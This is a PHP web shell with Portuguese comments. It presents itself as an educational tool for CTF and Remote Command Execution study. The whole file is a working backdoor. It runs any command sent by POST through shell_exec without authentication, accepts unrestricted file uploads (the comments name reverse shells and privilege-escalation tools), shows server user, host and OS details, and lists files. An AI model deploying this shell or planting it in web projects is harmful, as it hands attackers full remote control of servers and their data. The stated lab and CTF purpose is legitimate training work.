<?php

/**
 * ============================================================
 * RCE WebShell - Painel de Execução Remota de Comandos
 * ============================================================
 * Autor: Henrique Demezio
 * Objetivo: Ferramenta educacional para estudos de CTF e
 *           exploração de Remote Command Execution (RCE).
 *
 * ATENÇÃO:
 * Este código deve ser utilizado apenas em ambientes
 * controlados, como laboratórios ou CTFs.
 * ============================================================
 */


/**
 * ------------------------------------------------------------
 * Informações do sistema
 * ------------------------------------------------------------
 * Estas variáveis coletam dados do servidor onde a shell está
 * sendo executada.
 */

// Diretório atual onde o script está rodando
$currentDir = getcwd();

// Usuário do sistema executando o servidor web (geralmente www-data)
$user = trim(shell_exec('whoami'));

// Nome do host da máquina
$host = gethostname();

// IP do servidor web
$ip = $_SERVER['SERVER_ADDR'] ?? 'unknown';

// Versão do PHP instalada no servidor
$php = phpversion();

// Informações completas do sistema operacional
$os = php_uname();


/**
 * ------------------------------------------------------------
 * Execução de comandos
 * ------------------------------------------------------------
 * Recebe um comando enviado via POST e executa usando shell_exec.
 */

// Comando enviado pelo formulário
$cmd = $_POST['cmd'] ?? null;

// Variável para armazenar saída do comando
$output = '';

if ($cmd) {

    /**
     * shell_exec executa comandos no sistema operacional.
     *
     * "2>&1" redireciona erros para a saída padrão, permitindo
     * capturar erros também.
     */
    $output = shell_exec($cmd . " 2>&1");
}


/**
 * ------------------------------------------------------------
 * Upload de arquivos
 * ------------------------------------------------------------
 * Permite enviar arquivos para o servidor.
 * Muito usado em CTF para enviar ferramentas como:
 *
 * - linpeas.sh
 * - pspy
 * - reverse shells
 */

if (isset($_FILES['file'])) {

    move_uploaded_file(

        // arquivo temporário enviado pelo navegador
        $_FILES['file']['tmp_name'],

        // destino final
        $currentDir . '/' . $_FILES['file']['name']
    );
}


/**
 * ------------------------------------------------------------
 * File Manager
 * ------------------------------------------------------------
 * Lista todos os arquivos e diretórios do diretório atual.
 */

// scandir retorna lista de arquivos/pastas
$files = scandir($currentDir);

?>

<!DOCTYPE html>
<html lang="pt_BR">

<head>

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>RCE - WebShell</title>

    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.8/dist/css/bootstrap.min.css" rel="stylesheet">

    <style>
        /**
 * ------------------------------------------------------------
 * Estilo visual (Hacker Theme)
 * ------------------------------------------------------------
 */

        body {
            background: #010409;
            color: #00ff9c;
            font-family: monospace;
        }

        .card {
            background: #000;
            border: 1px solid #00ff9c33;
            box-shadow: 0 0 10px #00ff9c22;
            color: greenyellow;
        }

        .card-header {
            background: #020617;
            border-bottom: 1px solid #00ff9c33;
        }

        .terminal {
            background: #020617;
            padding: 15px;
            border-radius: 6px;
            white-space: pre-wrap;
            min-height: 200px;
        }

        input {
            background: #000 !important;
            color: #00ff9c !important;
            border: 1px solid #00ff9c !important;
        }

        .table {
            color: #00ff9c;
        }

        .btn-hack {
            background: #00ff9c;
            color: #000;
        }

        .btn-hack:hover {
            background: #00cc7a;
        }
    </style>

</head>

<body>

    <div class="container mt-4">

        <h3 class="mb-4">Remote Code Execution</h3>

        <div class="row">

            <!-- =========================================================
     SYSTEM INFO
========================================================= -->

            <div class="col-md-4">

                <div class="card mb-4">

                    <div class="card-header">
                        System Info
                    </div>

                    <div class="card-body">

                        <p><b>User:</b> <?= $user ?></p>
                        <p><b>Host:</b> <?= $host ?></p>
                        <p><b>IP:</b> <?= $ip ?></p>
                        <p><b>PHP:</b> <?= $php ?></p>
                        <p><b>OS:</b> <?= $os ?></p>

                    </div>

                </div>


                <!-- =========================================================
     UPLOAD DE ARQUIVOS
========================================================= -->

                <div class="card">

                    <div class="card-header">
                        Upload File
                    </div>

                    <div class="card-body">

                        <form method="POST" enctype="multipart/form-data">

                            <input type="file" name="file" class="form-control mb-2">

                            <button class="btn btn-hack w-100">
                                Upload
                            </button>

                        </form>

                    </div>

                </div>

            </div>


            <!-- =========================================================
     TERMINAL / EXECUÇÃO DE COMANDOS
========================================================= -->

            <div class="col-md-8">

                <div class="card mb-4">

                    <div class="card-header">
                        Command Execution
                    </div>

                    <div class="card-body">

                        <form method="POST">

                            <div class="input-group mb-3">

                                <span class="input-group-text">
                                    <?= $user ?>@<?= $host ?>:$
                                </span>

                                <input
                                    type="text"
                                    name="cmd"
                                    class="form-control"
                                    placeholder="Digite um comando..."
                                    autofocus>

                                <button class="btn btn-hack">
                                    Run
                                </button>

                            </div>

                        </form>

                        <div class="terminal text-white">

                            <?php if ($cmd): ?>

                                <pre><?= htmlspecialchars($cmd) . "\n\n" ?></pre>

                                <pre><?= htmlspecialchars($output ?: "Sem saída") ?></pre>

                            <?php endif; ?>

                        </div>

                    </div>

                </div>


                <!-- =========================================================
     FILE MANAGER
========================================================= -->

                <div class="card">

                    <div class="card-header">
                        File Manager
                    </div>

                    <div class="card-body">

                        <table class="table table-sm">

                            <thead>
                                <tr>
                                    <th>Name</th>
                                    <th>Type</th>
                                    <th>Size</th>
                                </tr>
                            </thead>

                            <tbody>

                                <?php foreach ($files as $file): ?>

                                    <tr>

                                        <td><?= $file ?></td>

                                        <td>
                                            <?= is_dir($file) ? 'DIR' : 'FILE' ?>
                                        </td>

                                        <td>
                                            <?= is_file($file) ? filesize($file) : '-' ?>
                                        </td>

                                    </tr>

                                <?php endforeach; ?>

                            </tbody>

                        </table>

                    </div>

                </div>

            </div>

        </div>

    </div>

</body>

</html>